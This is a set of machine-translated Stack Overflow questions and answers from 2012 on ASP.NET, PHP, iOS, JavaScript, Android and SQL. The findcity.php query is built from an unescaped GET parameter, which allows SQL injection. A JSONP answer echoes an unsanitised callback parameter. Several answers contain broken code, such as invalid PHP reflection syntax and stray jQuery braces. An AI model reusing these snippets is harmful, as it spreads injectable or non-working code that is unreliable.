# c# - FindControl 内部手风琴 ContentTemplate

> ID：11847734
> 
> 赞同：0
> 
> 时间：2012-08-07T14:04:21.123
> 
> 标签：c#, asp.net

我有一个手风琴，在我放置的 ContentTemplate 和下拉列表中。我正在使用 Accordion1_ItemDataBound 将数据表绑定到下拉列表。主要问题是我找不到下拉列表。

```
<ContentTemplate>
                                <table border="0" width="490px" style="background-color: transparent">
                                    <tr>
                                        <td>
                                        </td>
                                    </tr>
                                    <tr>
                                        <td align="right">
                                            <asp:TextBox runat="server" ID="txtNotes" TextMode="MultiLine" Height="100px" Width="200px"></asp:TextBox>
                                        </td>
                                        <td>
                                            <asp:Label runat="server" ID="lbltest"></asp:Label>
                                            <asp:DropDownList runat="server" ID="ddlStatus" Visible="true">
                                            </asp:DropDownList>
                                        </td>
                                        <td>
                                            <asp:Button runat="server" ID="btnSubmit" Text="שמור נתונים" />
                                        </td>
                                    </tr>
                                </table>
                                <%--<asp:Label ID="lblOrderID2" runat="server" Text='<%#Eval("MidaClient_ID")%>'></asp:Label>--%>
                                <%--<asp:Label ID="lblNotes" runat="server" Text='<%#Eval("Cand_Num")%>'></asp:Label>--%>
                                <%-- <asp:Button ID="btnSend" runat="server" Text="שלח" CommandName="send" />--%>
                            </ContentTemplate>

protected void Accordion1_ItemDataBound(object sender, AjaxControlToolkit.AccordionItemEventArgs e)
        {
            if (e.ItemType != AjaxControlToolkit.AccordionItemType.Content)
            {
                DataTable dt = new DataTable();
                //dt = db.GetStatus();
                dt.Columns.Add(new DataColumn("OfferID", typeof(int)));
                dt.Columns.Add(new DataColumn("TypeOffer", typeof(string)));

                dt.Rows.Add(new object[] { 0, "First Row" });
                dt.Rows.Add(new object[] { 1, "Second Row" });
                if (dt != null)
                {
                    DropDownList ddl = new DropDownList();
                    ddl = (DropDownList)e.AccordionItem.FindControl("ddlStatus");
                    if (ddl != null)
                    {
                        ClientScript.RegisterStartupScript(this.GetType(), "AlertBox", "alert('dropdownlist found');", true);
                    }
                    else
                    {
                        ClientScript.RegisterStartupScript(this.GetType(), "AlertBox", "alert('dropdownlist not found');", true);
                    }
                    //ddl.DataSource = dt;
                    //ddl.DataTextField = "Name";
                    //ddl.DataValueField = "ID";
                    //ddl.DataBind();
                }
            }

protected void LoadCandidates() 
{ 
    pds = new PagedDataSource(); 
    pds.DataSource = db.GetCandidates(456123, 6, "1037").DefaultView; 
    pds.AllowPaging = true; 
    pds.PageSize = 10; 
    if (SelectedPage > (pds.PageCount - 1)) 
        SelectedPage = pds.PageCount - 1; 
    if (SelectedPage < 0) 
    { 
        SelectedPage = 0; 
    } 
    pds.CurrentPageIndex = SelectedPage; 
    Accordion1.DataSource = pds; Accordion1.DataBind(); 
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-07T14:11:24.587

我注意到你在这个 if 语句中有 Find 调用：

```
if (e.ItemType != AjaxControlToolkit.AccordionItemType.Content) 
```

由于您的 ddl 在 ContentTemplate 内，因此该语句可能需要：

```
if (e.ItemType == AjaxControlToolkit.AccordionItemType.Content) 
```

# jetty - 制作可执行的war文件

> ID：11847736
> 
> 赞同：2
> 
> 时间：2012-08-07T14:04:29.080
> 
> 标签：jetty, war

有什么方法可以使war文件可执行。我知道我们可以使用jetty runner来执行war文件，但是当我们像exe文件一样双击它时，有什么方法可以执行这个war。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-07T14:07:05.130

一个war文件不是用来执行的，它是用来部署的。如果您想要一个快捷方式将战争部署到服务器（并且可以选择启动此服务器），您应该编写一个脚本来执行此操作（在 Windows 上使用批处理）。

# javascript - HTML5 URL 更新不刷新

> ID：11847742
> 
> 赞同：0
> 
> 时间：2012-08-07T14:05:09.943
> 
> 标签：javascript, html

我试过使用 HTML5 window.history.pushState 函数，但我不能让它工作。

这是功能：

```
 function changeUrl() {
        window.history.pushState(object, "Title", "?side=annoncer&sletid=1");
    } 
```

这是应该调用它的链接：

```
 <a href="javascript:void(0);" onClick="changeUrl();"> 
```

我做错什么了？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-08-07T14:11:25.507

你不需要设置一个对象

```
function changeUrl() {
        window.history.pushState(null, "Title", "?side=annoncer&sletid=1");
    } 
```

检查它，它会正常工作。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-07T14:15:01.610

将其更改为：

```
 window.history.pushState(null, "Title", "?side=annoncer&sletid=1"); 
```

# ios - transitionFromView: 和翻转的奇怪行为。

> ID：11847743
> 
> 赞同：8
> 
> 时间：2012-08-07T14:05:10.737
> 
> 标签：ios, objective-c, uiviewanimation, uiviewanimationtransition, uiviewanimation-curve

我有一面图像墙 ( `UIScrollView`)，里面有很多`UIImageView's`.

这是我的代码：

```
for (ThumbPosterModel *tPoster in _thumbsPosterStack) {

    UIImageView *imageView = [[UIImageView alloc] initWithImage:tPoster.thumb];
    imageView.userInteractionEnabled = YES;
    imageView.frame = CGRectMake(i, imageView.frame.origin.y, imageView.frame.size.width, imageView.frame.size.height);

    [tPoster setTag:tag];
    [_posterTagArr addObject:(BasicPosterModel*)tPoster];

    imageView.tag = tag;
    tag++;
    [posterWallScrollView addSubview:imageView];

    UITapGestureRecognizer *doubleTap = [[UITapGestureRecognizer alloc] initWithTarget:self action:@selector(imageDoubleTapped:)];
    doubleTap.numberOfTapsRequired = 2;
    [imageView addGestureRecognizer:doubleTap];
} 
```

这是我的 IBAction：

```
-(IBAction)imageDoubleTapped:(id)sender {
    NSInteger selectTag = (((UIGestureRecognizer*)sender).view.tag);
    for (BasicPosterModel *bPoster in _posterTagArr) {
        if(bPoster.tag == selectTag) {
            [UIView transitionFromView:(UIImageView*)((UIGestureRecognizer*)sender).view
                                toView:mySecordView //let's say next ImageView. Doesn't matter
                              duration:1.0
                               options:UIViewAnimationOptionTransitionCrossDissolve  
                            completion:^(BOOL finished) {
                                // animation completed
                            }];

        }
    }
} 
```

当我使用时：

`UIViewAnimationOptionTransitionCrossDissolve`这仅对我在 ScrollView 中的图像**有影响。**当我在这段代码中使用 `UIViewAnimationOptionTransitionFlipFromTop`这会影响我的滚动视图。

怎么可能？

当然，我希望我的动画效果只适用于单个图像。

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2012-08-14T16:25:23.653

以下是转换在概念上的工作方式：

1.  系统将fromView的父视图的当前状态渲染到离屏缓冲区（“之前”状态）
2.  fromView 从其父视图中移除
3.  toView 被添加到 parentView （可以为零，你是对的；在这种情况下，什么都没有添加）
4.  系统将父视图渲染到屏幕外缓冲区（“之后”状态）
5.  系统动画父视图从“之前”状态到“之后”状态的转换

在您的情况下，父视图是滚动视图，因此整个滚动视图都已转换。与您的看法相反，即使使用交叉溶解也是如此。只是大部分滚动视图（fromView 未覆盖的部分）在前后是相同的，因此看起来该部分似乎不参与转换 - 但确实如此。

如果我理解正确，您正在滚动视图中水平排列多个图像视图堆栈，并且每当有人双击堆栈中的“最上面”图像视图时，您希望直接在其下方“显示”图像，而不影响其他堆栈。

如果为这些堆栈中的每一个都添加一个与堆栈大小相同的容器视图到滚动视图，并将此堆栈的所有 ImageView 放入此容器视图而不是直接放入滚动视图，它将起作用。在点击时，只需像最初那样从点击视图转换为 nil 即可。屏幕上的过渡尺寸将仅限于容器视图（大致 - 卷曲和翻转使用超出其框架的一些空间）。

根据您的要求，您可能希望在删除堆栈中的最后一个图像后删除堆栈的容器视图。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-08-16T13:48:43.090

原因是它`UIViewAnimationOptionTransitionFlipFromTop`仅在 iOS 5.0 之后可用

来自[UIView 类参考](http://developer.apple.com/library/ios/#documentation/uikit/reference/uiview_class/uiview/uiview.html)：

> UIViewAnimationOptionTransitionFlipFromTop
> 围绕水平轴从上到下翻转视图的过渡。视图的顶部向前方移动，底部向后方移动。
> **在 iOS 5.0 及更高版本中可用。**
> 在 UIView.h 中声明。

因此，在 iOS 4.3 中它可能会导致不可预知的行为。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-07T17:36:41.070

首先，您需要`toView`列出才能`transitionFromView`正确使用。

以下是[Apple 的示例](http://developer.apple.com/library/ios/#documentation/windowsviews/conceptual/viewpg_iphoneos/animatingviews/animatingviews.html)：

```
[UIView transitionFromView:(displayingPrimary ? primaryView : secondaryView)
        toView:(displayingPrimary ? secondaryView : primaryView)
        duration:1.0
        options:(displayingPrimary ? UIViewAnimationOptionTransitionFlipFromRight :
                    UIViewAnimationOptionTransitionFlipFromLeft)
        completion:^(BOOL finished) {
            if (finished) {
                displayingPrimary = !displayingPrimary;
            }
    }]; 
```

我也相信这`transitionFromView`是假设将 superView 作为一个论点。

另外，我***认为***将 UImageView 添加到容器 UIView 并在容器上执行操作而不是直接在 UIImageView 上执行操作是更好的做法。因为本质上您将需要一个“父” UIView 来制作动画，而在动画期间添加和删除子视图。

* * *

## 回答 #4

> 赞同：-1
> 
> 时间：2012-08-14T09:00:27.443

正如 Cory 所说，transitionFromView: toView: 看起来像是打算有一个目标视图。如果您只想淡出一个视图，为什么不使用只在单个视图上工作的方法，例如 transitionView:duration:options:animations:completion。

文档中的示例似乎完全符合您的要求。

```
[UIView transitionWithView:containerView
       duration:0.2
       options:UIViewAnimationOptionTransitionFlipFromLeft
       animations:^{ [fromView removeFromSuperview]; [containerView addSubview:toView]; }
       completion:NULL]; 
```

# c# - 如何将值保存在 Eager Loaded 类中？

> ID：11847744
> 
> 赞同：0
> 
> 时间：2012-08-07T14:05:10.500
> 
> 标签：c#, entity-framework, eager-loading, edmx

将角色添加到我的用户并保存：

```
var user = DataContext.Users
    .Include("Roles")
    .Where(u => u.UserName.ToUpper() == username.ToUpper())
    .FirstOrDefault();
foreach (string rolename in roleNames)
{
    var role = FindRoleByName(rolename);
    user.Roles.Add(role);
    DataContext.Entry(user).State = EntityState.Modified; // probably not needed
    DataContext.SaveChanges();
} 
```

但它抛出异常

```
[System.Data.Entity.Infrastructure.DbUpdateException]   
{"Unable to update the EntitySet 'UserRoles' because it has a DefiningQuery and no <InsertFunction> element exists in the <ModificationFunctionMapping> element to support the current operation."} System.Data.Entity.Infrastructure.DbUpdateException 
```

编写此更新的正确方法是什么？

- - - 更新 - - - -

如果我删除`<DefiningQuery>`edmx 模型中的部分，则预先加载将`.include("Roles")`在 LINQ 语句中部分失败。

另外，我在 edmx（在 xml 编辑器中）中发现了一些错误注释。我想这就是问题所在。它说：

```
<!--Errors Found During Generation:
warning 6002: The table/view 'DNR.dbo.UserRoles' does not have a primary key defined. The key has been inferred and the definition was created as a read-only table/view.
--> 
```

那么，我是否必须在加入表中添加一个主键以及我的`UserId_FK`and `RoleId_FK`？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-07T14:09:30.113

这听起来像是一个映射问题。例如，如果实体是从数据库视图映射和/或缺少主键，就会发生这种情况。

您可以在 MSDN 论坛上找到一些可能的解决方案：[无法更新 EntitySet](http://social.msdn.microsoft.com/Forums/en-US/adodotnetentityframework/thread/220262bd-85d4-4f29-96a8-4a7d1d2c8293/)

# ruby-on-rails - 在 Ruby on Rails 中向 ActiveRecord 实例添加验证回调

> ID：11847750
> 
> 赞同：3
> 
> 时间：2012-08-07T14:05:23.090
> 
> 标签：ruby-on-rails, activerecord, refactoring

我们的 ActiveRecord 模型有许多不幸地使用网络的验证。例如，它使用 Facebook API 来验证给定的 Facebook ID 属性。我想将这些验证移出模型，以便它们仅在特定上下文中运行，而不是在 Factory Girl 在测试中创建时运行。它还需要以与 ActiveAdmin 兼容的方式完成。

我的想法是将方法提取到模块中，并让该模块适当地扩展 AR 实例。

```
module ArtistConnectionValidations
  def self.inject_to(record)
    record.extend self
    record.class_eval do
      before_validation :validate_facebook_name
    end
  end

  def validate_facebook_name
    # Contact Facebook API
  end
end 
```

在使用继承资源的 ActiveAdmin 中：

```
controller do  # Executes in controller context
  def resource
    ArtistConnectionValidations.inject_to(Artist.find(params[:id]))
  end
end 
```

不幸的是，这些验证不会被调用，因为它们被添加到实例的单例类中，并且`#valid?`方法回调看不到它们。各种其他策略导致它被添加到基类中，从而感染整个系统。有任何想法吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-10-02T10:16:46.997

我不确定这是否适合你。但是为什么不创建一个子类呢？

如果我正确理解你在这里需要什么，我认为它会使代码和使用更清晰。

```
#artist.rb
class Artist < ActiveRecord::Base
end

#artist_with_validations.rb
class ArtistWithValidations < Artist
  before_validation :validate_facebook_name

  def validate_facebook_name
    # Contact Facebook API
  end
end 
```

然后，您可以使用这两种模型之一，具体取决于您是否希望用户进行验证。

# php - 如何在 PHP 中将（转换）对象转换为没有类名前缀的数组？

> ID：11847751
> 
> 赞同：5
> 
> 时间：2012-08-07T14:05:26.413
> 
> 标签：php, arrays, object

如何在 PHP 中将（转换）对象转换为没有类名前缀的数组？

```
class Teste{

    private $a;
    private $b;

    function __construct($a, $b) {
        $this->a = $a;
        $this->b = $b;
    }

}

var_dump((array)(new Teste('foo','bar'))); 
```

结果：

```
array
  '�Teste�a' => string 'foo' (length=3)
  '�Teste�b' => string 'bar' (length=3) 
```

预期的：

```
array (
a => 'foo'
b => 'bar' ) 
```

* * *

## 回答 #1

> 赞同：14
> 
> 时间：2012-08-07T14:10:22.700

从[手册](http://php.net/manual/en/language.types.array.php#language.types.array.casting)：

> 如果将对象转换为数组，则结果是一个数组，其元素是对象的属性。键是成员变量名，有几个值得注意的例外：整数属性不可访问；**私有变量在变量名前面加上类名**；受保护的变量在变量名前有一个“*”。**这些前置值在任一侧都有空字节**。这可能会导致一些意外行为：

因此，您可以像这样解决这个问题：

```
$temp = (array)(new Teste('foo','bar'));
$array = array();
foreach ($temp as $k => $v) {
  $k = preg_match('/^\x00(?:.*?)\x00(.+)/', $k, $matches) ? $matches[1] : $k;
  $array[$k] = $v;
}
var_dump($array); 
```

没有办法控制/禁用这种行为似乎很奇怪，因为没有碰撞的风险。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-08-07T14:11:43.727

“类名前缀”是属性（内部）名称的一部分。因为您将两者都声明为`private`PHP 需要一些东西来将其与属性`$a`和`$b`任何子类区分开来。

绕过它的最简单方法：不要让它们`private`. 您可以将它们声明为`protected`。

但是，这并不是在所有情况下都可以解决的问题，因为通常人们会将某事声明为`private`有意图。我建议实施一种方法，为您进行转换。这使您可以更好地控制结果数组的外观

```
public function toArray() {
  return array(
    'a' => $this->a,
    'b' => $this->b
  );
} 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-08-07T14:16:24.870

据我所知，PHP 没有简单的方法来做你想做的事。大多数语言都没有。你应该考虑反思。看看这个文档：[http ://www.php.net/manual/en/reflectionclass.getproperties.php](http://www.php.net/manual/en/reflectionclass.getproperties.php)

我制作了一个应该按预期工作的功能：

```
function objectToArr($obj)
{
    $result = array();
    ReflectionClass $cls = new ReflectionClass($obj);
    $props = $cls->getProperties();
    foreach ($props as $prop)
    {
        $result[$prop->getName()] = $prop->getValue($obj);
    }
} 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-08-07T14:18:31.890

您可以使用反射来解决此任务。但像往常一样，这是一个强有力的指标，表明你的班级设计有些破损。然而：

```
function objectToArray($obj) {
    // Create a reflection object
    $refl = new ReflectionClass($obj);

    // Retrieve the properties and strip the ReflectionProperty objects down
    // to their values, accessing even private members.
    return array_map(function($prop) use ($obj) {
        $prop->setAccessible(true);
        return $prop->getValue($obj);
    }, $refl->getProperties());
}

// Usage:
$arr = objectToArray( new Foo() ); 
```

# php - 这个 PHP PDO 例程有什么问题？

> ID：11847752
> 
> 赞同：2
> 
> 时间：2012-08-07T14:05:35.367
> 
> 标签：php, mysql, pdo

我从 PDO 开始并尝试替换此代码，该代码有效：

```
$dbh->query("INSERT INTO sugestao (id, fbid, username, latitude, longitude, endereco, categoria, titulo, descricao, foto)
                        VALUES (null, 
                            '".$fbid."', 
                            '".$username."', 
                            '".$lat."', 
                            '".$lon."', 
                            '".$endereco."',
                            '".$categoria."', 
                            '".$titulo."',
                            '".$descricao."',
                            '".$foto."')"); 
```

有了这个，这似乎更安全，更易于维护，并且还应该允许我安全地插入最后一个 ID：

```
$dbh->beginTransaction();

    $dbh->prepare("INSERT INTO sugestao (id, fbid, username, latitude, longitude, endereco, categoria, titulo, descricao, foto)
                        VALUES (null, :fbid, :username, :lat, :lon, :endereco, :categoria, :titulo, :descricao, :foto)");
    $dbh->bindParam(":fbid", $fbid);
    $dbh->bindParam(":username", $username);
    $dbh->bindParam(":lat", $lat);
    $dbh->bindParam(":lon", $lon);
    $dbh->bindParam(":endereco", $endereco);
    $dbh->bindParam(":categoria", $categoria);
    $dbh->bindParam(":titulo", $titulo);
    $dbh->bindParam(":descricao", $descricao);
    $dbh->bindParam(":foto", $foto);
    $dbh->execute();
    $lastid = $dbh->lastInsertId();
    $dbh->commit(); 
```

第二个，给我一个 500 服务器错误。有什么线索吗？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-08-07T14:11:01.160

`bindParam`并且`execute`是来自[PDOStatement](http://www.php.net/manual/fr/class.pdostatement.php)而不是来自 PDO 的函数：

```
$statement = $dbh->prepare(...);
$statement->bindParam();
$statement->execute(); 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-08-07T14:11:52.400

`$dbh->bindParam()`没有定义。

```
// Create the statement
$stmt = $dbh->prepare("INSERT INTO sugestao (id, fbid, username, latitude, longitude, endereco, categoria, titulo, descricao, foto)
                       VALUES (null, :fbid, :username, :lat, :lon, :endereco, :categoria, :titulo, :descricao, :foto)");

// Bind parameters
$stmt->bindParam(":fbid", $fbid);
// ...
$stmt->bindParam(":foto", $foto);

// Execute the statement
try {
    $dbh->beginTransaction();
    $stmt->execute();
    $dbh->commit();
} catch (PDOExecption $e) {
    $dbh->rollback();
    // Do whatever you want
}

// Read last ID on the statement
$lastId = $stmt->lastInsertId(); 
```

# php - MYSQL/Ajax/PHP 生成的下拉菜单未通过“GET”传递值

> ID：11847760
> 
> 赞同：0
> 
> 时间：2012-08-07T14:06:22.480
> 
> 标签：php, mysql, ajax, drop-down-menu, get

在这方面看到了很多线程，但不确定是否与我正在做的事情有关。我尝试了一些“解决方案”，但都无济于事。这是我的一段代码：

```
<td><select name="County" onChange="getCity('findcity.php?county='+this.value)"> 
```

……

```
 <td><fieldset id="f2">
     <select name="Town">
     <option value="Any">Any Town</option>
     </select>
     </fieldset>
       </td></tr> 
```

……

```
</td></tr>
           <tr>
           <td><fieldset id="f4">
           <input type="submit" name="Search!">
           </fieldset>
           </form>
           </td>
           </tr> 
```

Town Select 一开始只是作为一个占位符。在更改第一个下拉列表时，然后通过 getCity() 函数填充第二个。它将选定的值传递给 findcity.php，然后使用 mysql 通过 findcity.php 填充它，然后用重复项替换 TOWN 选择：

MySQL 生成一个：（有效）

```
<select name="Town">
<option value="Any">Any Town</option>
<? while($row=mysql_fetch_array($result)) { ?>
   <option value="<?=$row['dir_town']?>"><?=$row['dir_town']?></option>
<? } ?>
</select> 
```

这是完成所有工作的函数：

```
<script>
function getXMLHTTP() { //function to return the xml http object
        var xmlhttp=false;  
        try{
            xmlhttp=new XMLHttpRequest();
        }
        catch(e)    {       
            try{            
                xmlhttp= new ActiveXObject("Microsoft.XMLHTTP");
            }
            catch(e){
                try{
                xmlhttp = new ActiveXObject("Msxml2.XMLHTTP");
                }
                catch(e1){
                    xmlhttp=false;
                }
            }
        }

        return xmlhttp;
    }

    function getCity(strURL) {      

        var req = getXMLHTTP();

        if (req) {

            req.onreadystatechange = function() {
                if (req.readyState == 4) {
                    // only if "OK"
                    if (req.status == 200) {                        
                        document.getElementById('f2').innerHTML=req.responseText;   

                    } else {
                        alert("There was a problem while using XMLHTTP:\n" + req.statusText);
                    }
                }               
            }           
            req.open("GET", strURL, true);
            req.send(null);
        }

    }

</script> 
```

GET 上的最终结果是这样的：

```
results.php?County=Kent&Sector=Any&Search%21=Submit 
```

如果我什么都不做就提交它会起作用：

```
results.php?County=Bedfordshire&Town=Any&Sector=Any&Search%21=Submit 
```

我想是因为它没有取代输入框。我使用了字段集，希望消除我认为是因为它在 DIV 中而引起的问题。

叹息，我知道有一个简单的解决方案，我只是不记得是什么。

此外，如果您告诉我如何从请求中删除“&Search..”部分，则可以加分：S 不知道为什么搜索按钮会将其自身放入其中，它在我所做的任何其他作品中从未有过，是因为字段集？我期待任何答案，在此先感谢。

**编辑：如果有人甚至可以提供另一种方法来填充第二个下拉菜单并解决这个问题，我会很满意。**

```
$county=$_GET['county'];
//$county =mysql_real_escape_string($county);
include('includes/dbc.php');

$query="SELECT DISTINCT `dir_town` FROM `directories` WHERE `dir_county` = '$county' ORDER BY `dir_town` ASC";
$result=mysql_query($query);?>
<select name="Town">
<option value="Any">Any</option>
<? while($row=mysql_fetch_array($result)) { ?>
       <option value="<?=$row['dir_town']?>"><?=$row['dir_town']?></option>
    <? } ?>
    </select> 
```

我的 dbc.php 完成所有连接。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-07T14:09:40.770

首先，删除“搜索！” 从您的查询字符串中，替换

```
<input type="submit" name="Search!"> 
```

和

```
<input type="submit" value="Search!" /> 
```

“搜索”被添加到查询字符串中，因为它有一个`name`属性。删除`name`并从查询字符串中删除输入。

**更新：**

您可能需要考虑使用 jQuery 进行 AJAX 调用。它更干净（您可以删除那个丑陋的`getHMLHTTP()`功能）。只需包含 jQuery 源代码

```
<script language="javascript" type="text/javascript" src="http://code.jquery.com/jquery-latest.min.js"></script> 
```

现在您可以开始使用 jQuery 调用并摆脱内联`onchange`属性：

```
<script language="javascript" type="text/javascript">
    $("select[name=County]").on('change', function() {
        $.get('findcity.php', 
            {
                county: $("this").val()
            }, function (data) {
                $("#city").replace(data);
            }
        );
    });

}
</script> 
```

`$.get()`( )中的回调函数将用*findcity.php*`$("#city").replace(data);`返回的任何内容替换`id`为“city”的元素。由于这应该是另一个下拉列表，我们将仅以原始形式执行此操作：

 *```
<select name="Town" id="city"></select> 
```

然后，当您的输出来自*findcity.php*时，它将用填充的下拉列表替换它：

```
<select name="Town" id="city">
    <option value="Any">Any Town</option>
    <? while($row=mysql_fetch_array($result)) { ?>
       <option value="<?=$row['dir_town']?>"><?=$row['dir_town']?></option>
    <? } ?>
</select> 
```

现在，如果您需要对“Town”下拉菜单做类似的事情，请重复“Town”的 jQuery`.on()`代码（因为我们给它一个 ID，我们可以通过名称或 ID 来引用它）。

```
//$("#city") can be used instead of $("select[name=Town]") - both return the same element
$("select[name=Town]").on('change', function() { 
    // do something here
}); 
```*

# android - Android：RecentSearchProvider - 从字符串资源设置权限？

> ID：11847764
> 
> 赞同：0
> 
> 时间：2012-08-07T14:06:30.417
> 
> 标签：android, history, provider

嗨，我坚持这个。

像这样设置RecentSearchProvider

公共类 MyRecentSuggestionProvider 扩展 SearchRecentSuggestionsProvider {

```
public final static int MODE = DATABASE_MODE_QUERIES;
public static String AUTHORITY = "com.xxxxx.authority";

public MyRecentSuggestionProvider() {
    super();

    setupSuggestions(AUTHORITY, MODE);

    }
} 
```

但是我想从 res/strings 中设置权限，即。

```
 setupSuggestions(getContext().getResources().getString(R.string.authority), MODE); 
```

虽然这会得到一个空指针异常。

关于如何解决这个问题的任何建议？艾登

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-28T09:33:36.583

花了我一段时间，但我找到了一个很好的方法来做到这一点。

由于我的应用程序可以针对许多目标构建，因此我使用了不同的包名称。

```
String packagename = getClass().getPackage().getName();
        if (packagename.equals("com.company1")){
            AUTHORITY = "com.company1.authority";
        }else{
            AUTHORITY = "com.company2.authority";
        } 
```

希望这可以帮助某人

# java - 将信息从 Runnable 传递给 ScheduledJobThreadExecutor.afterExecute

> ID：11847765
> 
> 赞同：0
> 
> 时间：2012-08-07T14:06:32.820
> 
> 标签：java, scheduled-tasks, threadpoolexecutor

我正在安排定期任务并使用 ScheduledJobThreadExecutor。在执行 runnable 时，可能会发生一些需要我做出反应的事情，但它必须在任务完成后才会发生。

起初我以为我可以在 aftetExecute 中访问这些信息，因为我在那里得到了一个 Runnable（而且我可以查询它的状态）。原来它不是我提交的原始可运行文件！但是一个 ScheduledFutureTask，我找不到解开我原来的 Runnable 的方法。

我能做些什么？这种要求有成语吗？

谢谢！

# java - 如何将字符串转换为时区：Android

> ID：11847770
> 
> 赞同：5
> 
> 时间：2012-08-07T14:06:44.350
> 
> 标签：java, android, string, timezone

我有一个字符串`myString = "Asia/kolkata";`

我需要设置`TimeZone.setDefault(myString);`

**我已经尝试过如上所述。但不能在 TimeZone 参数中给出字符串。**

这个怎么设置？

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2012-08-07T14:08:25.913

您用于[`TimeZone.getTimeZone(String)`](http://docs.oracle.com/javase/7/docs/api/java/util/TimeZone.html#getTimeZone%28java.lang.String%29)获取时区，然后您可以将其设置为默认值。

# javascript - 在 Phonegap 模拟器/iPhone 中解析 JSON 与通过浏览器

> ID：11847771
> 
> 赞同：1
> 
> 时间：2012-08-07T14:06:45.693
> 
> 标签：javascript, jquery, jquery-mobile, cordova

我正在使用Phonegap 开发一个iPhone 应用程序，前端只有JS/HTML5，后端是.NET。对于登录，我只是调用 Web 服务并取回 JSON。我遇到的问题是在桌面浏览器中调试它与在实际手机/模拟器上调试它时。

当存在有效登录时，检索到的 JSON 如下所示：

```
{"AuthToken":null,"Errors":[],"Success":true,"Message":null,"IsValid":true} 
```

所以我有这个 Ajax`success`函数（jQuery）：

```
success: function (data) {
    //this works on phone, but not in browser
    var success = data.Success;  //returns true             
    //this works in browser, but errors out on phone
    var dta = JSON.parse(data);
   success = dta.Success //returns true;
} 
```

知道为什么会发生这种情况或我该如何纠正吗？对我来说，使用 Firebug 在浏览器中进行调试比总是使用模拟器更容易。我一直在使用其他一些调试方法（一种是 Weinre），但没有一个比使用 Firebug 更好。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-07T20:04:22.873

我昨天也遇到了同样的问题，在 iPhone 上运行顺利，但在 web 上却没有，烦人。

经过一番搜索我发现，如果你设置`dataType: 'jsonp'`, 并设置一个回调函数`jsonp: 'jsoncallback'`

我的处理程序看起来像这样：

```
$('form').on('submit', function(event){
        var myData = $(this).serialize();
        jQuery.ajax({
            url: 'www.mysite.com/submit.php',
            type: 'POST',
            data: myData,
            dataType: 'jsonp',
            jsonp: 'jsoncallback',
            success: function(data, textStatus, jqXHR){
                alert('success: ' + data)
                },
            error:  function(jqXHR, textStatus, errorThrown){
                alert('error')
                }
            });
        return false;
        }) 
```

在服务器端，我以：

```
echo $_GET['jsoncallback'] . '(' . json_encode($myData) . ');' 
```

由于您的本地目录与您的服务器不在同一个域中，因此有关[同源策略的内容。](http://en.wikipedia.org/wiki/Same_origin_policy)显然 jsonp（p 表示填充）可以跨域工作，我会在找到后立即发布解释这一点的文章。

**更新：** [这是我得到提示的地方，](http://samcroft.co.uk/2011/updated-loading-data-in-phonegap-using-jquery-1-5/)也许你已经用谷歌搜索过了

希望我能给你 .NET 代码，但我希望这会有所帮助

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-07T19:47:46.930

简单的小东西。。

需要为调用中的参数添加 dataType: "json" 以使其在 Web 端工作。

# c# - 在回发中，更改 Masterpage 代码隐藏显示的字段内容

> ID：11847773
> 
> 赞同：0
> 
> 时间：2012-08-07T14:06:50.233
> 
> 标签：c#, javascript, asp.net

我正在编写一个 asp.net 应用程序。在我的项目中，某些页面输出是由 MasterPage.master.cs 代码隐藏引起的。
即，渲染了一些页眉，并指示了一些关于当前状态的文本字段。
现在我遇到了一种情况，在回发之后，其中一个这样的文本字段被更改了。跟踪显示 Masterpage 代码（附加到其 Page_Load 方法）在回发处理程序之前运行。
因此，该字段在程序中发生了更改，但在我再次重新加载页面之前它在标题中的指示并没有改变 - 仅仅是因为指示发生在调用处理程序之前。
我需要一种在回发后更改该标头的好方法。也许在 onLoad 上有一些 javascript 调用。或一些 C# 技巧。我感谢所有的意见。
我的代码是：

```
masterpage.master.cs: 
protected void Page_Load(object sender, EventArgs e) { PROJECTS project = 
Util.getProject(Session); ProjectName.Text = "Project: " + (String)project.NAME;
ProjectName.Visible = true; } 
```

# sql - Firebird SQL：带有空值的通配符 %

> ID：11847775
> 
> 赞同：0
> 
> 时间：2012-08-07T14:06:52.787
> 
> 标签：sql, firebird

我有一个 smallint 字段，其中有一些记录在该字段中有空值。因此，当我在选择中使用 % 时，只会显示该字段中的任何值的记录。

我想问有没有其他通配符可以用来显示所有记录，包括那些有空值的记录？或者我必须使用 or is null ？

谢谢

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-08-07T14:11:20.680

NULL 没有值，也无法与其他值进行比较，这就解释了您的查询失败的原因。如果你也想获取 NULL 值，你必须添加`OR your_field IS NULL`到你的 WHERE 子句中，正如你已经指出的那样。

**注意**
有时，NULL 可能会让人感到困惑，尤其是对于刚开始使用数据库的人来说。记住 NULL 行为方式的一个好方法是认为它的值是“*我不知道的东西*”。然后，当您编写查询时，您会发现针对 NULL 的比较失败是有道理的。

例如，“NULL 是否大于零？” 可能会令人困惑。但是，如果您将问题视为“我不知道的东西是否大于零？”，它会立即变得有意义：答案是“我不知道”（这就是不返回该行的原因）。:)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-07T14:24:15.853

您可以使用 COALESCE 函数将 NULL 替换为一些预定义的值。例如：

```
SELECT
  *
FROM
  my_table
WHERE
  COALESCE(my_field, -1) = some_value 
```

# php - Yii 使用 Jquery 从单选按钮列表中获取选定的值

> ID：11847780
> 
> 赞同：3
> 
> 时间：2012-08-07T14:07:04.183
> 
> 标签：php, jquery, yii, radio-button

